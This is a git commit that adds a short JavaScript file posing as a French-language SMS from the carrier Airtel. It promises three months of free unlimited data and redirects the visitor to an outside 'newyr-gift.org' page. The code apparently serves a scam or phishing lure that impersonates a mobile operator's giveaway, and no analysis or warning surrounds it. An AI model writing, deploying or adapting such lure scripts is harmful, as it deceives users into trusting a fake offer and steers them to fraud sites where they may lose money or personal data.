09cc37da4eb80fd1a27a91076488d1a9b944f83d
ukebeblog <esther001imoh@gmail.com>
2025-01-22 16:19:48 +0100

    Create airtel-fr-active.js

---
+++ airtel-fr-active.js
@@ -0,0 +1,6 @@
+
+var password = 'DONNÉES ILLIMITÉES'
+password=prompt('SMS: Félicitations, vous êtes admissible à 3 mois de données gratuites illimitées, veuillez appuyer sur OK pour activer maintenant   ','DONNÉES ILLIMITÉES');
+if (password != 'DONNÉES ILLIMITÉES') {
+location.href='https://newyr-gift.org/airtel-fr.html';
+}
